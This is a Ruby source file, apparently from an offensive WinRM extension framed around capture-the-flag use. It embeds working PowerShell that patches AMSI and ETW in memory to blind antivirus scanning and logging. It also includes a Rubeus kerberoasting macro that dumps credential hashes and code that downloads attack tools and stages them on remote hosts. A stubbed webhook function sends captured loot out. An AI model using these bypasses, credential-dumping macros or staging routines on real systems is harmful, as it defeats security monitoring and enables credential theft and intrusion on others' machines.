# evil-winrm-ctf-extender/lib/evil_ctf/tools.rb

require 'fileutils'
require 'zip'
require 'uri'
require 'net/http'
require 'json'
require 'base64'
require 'digest/sha1'
require 'readline'
require 'shellwords'

module EvilCTF::Tools
  TOOL_REGISTRY = {
    # ... (same as original registry, truncated for brevity)
  }.freeze

  # AMSI bypass script
  BYPASS_4MSI_PS = <<~PS
    $kernel32 = @"
    using System; using System.Runtime.InteropServices;
    public class kernel32 {
        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    "@
    Add-Type $kernel32
    $amsiDll = [kernel32]::LoadLibrary("amsi.dll")
    $scanBuffer = [kernel32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
    $oldProtect = 0
    [kernel32]::VirtualProtect($scanBuffer, [uint32]5, 0x40, [ref]$oldProtect) | Out-Null
    $patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanBuffer, 6)
    "[+] AMSI bypassed (AmsiScanBuffer patched)"
    try { IEX ("Am"+"siU"+"tils") } catch { "[+] Bypass confirmed" }
  PS

  # ETW bypass script
  ETW_BYPASS_PS = <<~PS
    $kernel32 = @"
    using System; using System.Runtime.InteropServices;
    public class kernel32 {
        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    "@
    Add-Type $kernel32
    $ntdll = [kernel32]::LoadLibrary("ntdll.dll")
    $funcs = @("EtwEventWrite","EtwEventWriteTransfer","EtwEventWriteFull","EtwEventWriteEx")
    $patch = [Byte[]] (0x48, 0x33, 0xC0, 0xC3)
    foreach ($f in $funcs) {
      $addr = [kernel32]::GetProcAddress($ntdll, $f)
      if ($addr -ne 0) {
        $old = 0
        [kernel32]::VirtualProtect($addr, 4, 0x40, [ref]$old) | Out-Null
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 4)
      }
    }
    try {
      $type = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
      $field = $type.GetField('etwProvider','NonPublic,Static')
      $field.SetValue($null, [Activator]::CreateInstance("System.Diagnostics.Eventing.EventProvider", [Guid]::NewGuid()))
    } catch {}
    "[+] Full ETW bypass completed"
  PS

  class CommandManager
    def initialize
      @aliases = { 'ls'=>'Get-ChildItem', 'whoami'=>'$env:USERNAME', 'pwd'=>'Get-Location', 'ps'=>'Get-Process' }
      @macros = {
        'kerberoast'     => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\Rubeus.exe" kerberoast /outfile:C:\\Users\\Public\\hashes.txt 2>$null'],
        # ... (rest of macros)
      }
    end

    def expand_alias(cmd)
      @aliases.each do |k, v|
        return cmd.sub(k, v) if cmd.start_with?(k)
      end
      cmd
    end

    def expand_macro(name, shell, webhook: nil)
      macro = @macros[name.downcase]
      return false unless macro

      puts "[*] Expanding macro: #{name}"
      macro.each do |step|
        result = shell.run(step)
        puts result.output.strip
        matches = grep_output(result.output)
        if matches.any?
          save_loot(matches)
          beacon_loot(webhook, matches) if webhook
        end
      end
      true
    end

    def list_macros; @macros.keys.sort end
    def list_aliases; @aliases.keys.sort end
  end

  # Helper functions for tool handling
  def self.download_tool(key)
    tool = TOOL_REGISTRY[key]
    return nil unless tool && (tool[:download_url] || tool[:backup_urls])

    FileUtils.mkdir_p('tools')
    path = File.join('tools', tool[:filename])
    return path if File.exist?(path)

    all_urls = [tool[:download_url]] + (tool[:backup_urls] || [])
    all_urls.compact!
    success = false

    all_urls.each do |url|
      next unless url
      puts "[*] Trying #{url}..."
      success = download_from_url(url, path)
      break if success
    end

    success ? path : nil
  rescue => e
    puts "[!] Download failed for #{key}: #{e.message}"
    nil
  end

  def self.download_from_url(url, path)
    success = false

    curl_cmd = "curl -L --fail -o #{Shellwords.escape(path)} #{Shellwords.escape(url)}"
    success = system("#{curl_cmd} > /dev/null 2>&1") if success == false
    unless success
      wget_cmd = "wget -O #{Shellwords.escape(path)} #{Shellwords.escape(url)}"
      success = system("#{wget_cmd} > /dev/null 2>&1")
    end

    unless success
      begin
        URI.open(url) do |f|
          File.binwrite(path, f.read)
        end
        success = true
      rescue => e
        puts "[!] Ruby open-uri download failed: #{e.message}"
      end
    end

    unless success
      ps_cmd = "powershell -Command \"try { Invoke-WebRequest -Uri '#{url}' -OutFile '#{path}' -UseBasicParsing } catch { exit 1 }\""
      success = system(ps_cmd)
    end

    success
  end

  def self.download_missing_tools; TOOL_REGISTRY.each_key { |k| download_tool(k) }; end

  # Auto staging logic (simplified from original)
  def self.safe_autostage(tool_key, shell, options, logger)
    tool = TOOL_REGISTRY[tool_key]
    return false unless tool
    remote_path = tool[:recommended_remote]
    check_cmd = "if (Test-Path '#{remote_path}') { 'EXISTS' } else { 'MISSING' }"
    result = shell.run(check_cmd)
    return true if result.output.include?('EXISTS')

    arch = get_system_architecture(shell)
    adjusted_tool = tool.dup
    # architecture-specific adjustments omitted for brevity

    local_path = find_tool_on_disk(tool_key)
    unless local_path && File.exist?(local_path)
      puts "[!] Local tool not found: #{adjusted_tool[:filename]}"
      local_path = download_tool(tool_key)
      return false unless local_path && File.exist?(local_path)
    end

    puts "[*] Staging #{adjusted_tool[:name]} to #{remote_path}"
    upload_file(local_path, remote_path, shell)
  rescue => e
    puts "[!] Auto staging failed: #{e.message}"
    false
  end

  def self.list_available_tools
    puts "\n AVAILABLE TOOLS ".ljust(70, '=')
    TOOL_REGISTRY.group_by { |_, v| v[:category] }.each do |cat, tools|
      puts "\n #{cat.upcase}:"
      tools.each do |key, t|
        local_status = File.exist?(File.join('tools', t[:filename])) ? '📁' : '❌'
        puts " [#{local_status}] #{t[:name]} (#{key}) - #{t[:description]}"
      end
    end
    puts "\nCommands:"
    puts "  tools                   - List available tools"
    puts "  download_missing        - Download all missing tools into ./tools"
    puts "  tool <name>             - Stage and use a specific tool"
    puts "  tool all                - Stage all available tools"
    puts '=' * 70
  end

  # Helper functions for loot handling (simplified)
  def self.grep_output(output); [] end # placeholder
  def self.save_loot(matches); end # placeholder
  def self.beacon_loot(webhook, matches); end # placeholder
end

